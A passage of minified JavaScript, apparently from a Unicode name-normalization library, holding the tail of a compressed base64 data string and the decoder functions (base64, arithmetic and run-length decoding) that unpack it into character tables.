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";
    const t1 = new Map([[8217, "apostrophe"], [8260, "fraction slash"], [12539, "middle dot"]])
      , n1 = 4;
    function IM(t) {
        let e = 0;
        function n() {
            return t[e++] << 8 | t[e++]
        }
        let s = n()
          , o = 1
          , l = [0, 1];
        for (let L = 1; L < s; L++)
            l.push(o += n());
        let u = n()
          , d = e;
        e += u;
        let p = 0
          , h = 0;
        function m() {
            return p == 0 && (h = h << 8 | t[e++],
            p = 8),
            h >> --p & 1
        }
        const y = 31
          , w = 2 ** y
          , E = w >>> 1
          , S = E >> 1
          , _ = w - 1;
        let x = 0;
        for (let L = 0; L < y; L++)
            x = x << 1 | m();
        let b = []
          , I = 0
          , O = w;
        for (; ; ) {
            let L = Math.floor(((x - I + 1) * o - 1) / O)
              , Y = 0
              , W = s;
            for (; W - Y > 1; ) {
                let Z = Y + W >>> 1;
                L < l[Z] ? W = Z : Y = Z
            }
            if (Y == 0)
                break;
            b.push(Y);
            let D = I + Math.floor(O * l[Y] / o)
              , se = I + Math.floor(O * l[Y + 1] / o) - 1;
            for (; ((D ^ se) & E) == 0; )
                x = x << 1 & _ | m(),
                D = D << 1 & _,
                se = se << 1 & _ | 1;
            for (; D & ~se & S; )
                x = x & E | x << 1 & _ >>> 1 | m(),
                D = D << 1 ^ E,
                se = (se ^ E) << 1 | E | 1;
            I = D,
            O = 1 + se - D
        }
        let z = s - 4;
        return b.map(L => {
            switch (L - z) {
            case 3:
                return z + 65792 + (t[d++] << 16 | t[d++] << 8 | t[d++]);
            case 2:
                return z + 256 + (t[d++] << 8 | t[d++]);
            case 1:
                return z + t[d++];
            default:
                return L - 1
            }
        }
        )
    }
    function kM(t) {
        let e = 0;
        return () => t[e++]
    }
    function H_(t) {
        return kM(IM(OM(t)))
    }
    function OM(t) {
        let e = [];
        [..."ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"].forEach( (o, l) => e[o.charCodeAt(0)] = l);
        let n = t.length
          , s = new Uint8Array(6 * n >> 3);
        for (let o = 0, l = 0, u = 0, d = 0; o < n; o++)
            d = d << 6 | e[t.charCodeAt(o)],
            u += 6,
            u >= 8 && (s[l++] = d >> (u -= 8));
        return s
    }
    function NM(t) {
        return t & 1 ? ~t >> 1 : t >> 1
    }
    function MM(t, e) {
        let n = Array(t);
        for (let s = 0, o = 0; s < t; s++)
            n[s] = o += NM(e());
        return n
    }
    function Jl(t, e=0) {
        let n = [];
        for (; ; ) {
            let s = t()
              , o = t();
            if (!o)
                break;
            e += s;
            for (let l = 0; l < o; l++)
                n.push(e + l);
            e += o + 1
        }
        return n
    }
    function z_(t) {
        return $l( () => {
            let e = Jl(t);
            if (e.length)
                return e
        }
        )
    }
    function G_(t) {
        let e = [];
        for (; ; ) {
            let n = t();
            if (n == 0)
                break;
            e.push(DM(n, t))
        }
        for (; ; ) {
            let n = t() - 1;
            if (n < 0)
                break;
            e.push(LM(n, t))
        }
        return e.flat()
    }
    function $l(t) {
        let e = [];
        for (; ; ) {
            let n = t(e.length);
            if (!n)
                break;
            e.push(n)
        }
        return e
    }
    function q_(t, e, n) {
        let s = Array(t).fill().map( () => []);
        for (let o = 0; o < e; o++)
            MM(t, n).forEach( (l, u) => s[u].push(l));
        return s
    }
    function DM(t, e) {
        let n = 1 + e()
          , s = e()
          , o = $l(e);
        return q_(o.length, 1 + t, e).flatMap( (u, d) => {
            let[p,...h] = u;
            return Array(o[d]).fill().map( (m, y) => {
                let w = y * s;
                return [p + y * n, h.map(E => E + w)]
            }
            )
        }
        )
    }
    function LM(t, e) {
        let n = 1 + e();
        return q_(n, 1 + t, e).map(o => [o[0], o.slice(1)])
    }
    function UM(t) {
        let e = []
          , n = Jl(t);
        return o(s([]), []),
        e;
        function s(l) {
            let u = t()
              , d = $l( () => {
                let p = Jl(t).map(h => n[h]);
                if (p.length)
                    return s(p)
            }
            );
            return {
                S: u,
                B: d,
                Q: l
            }
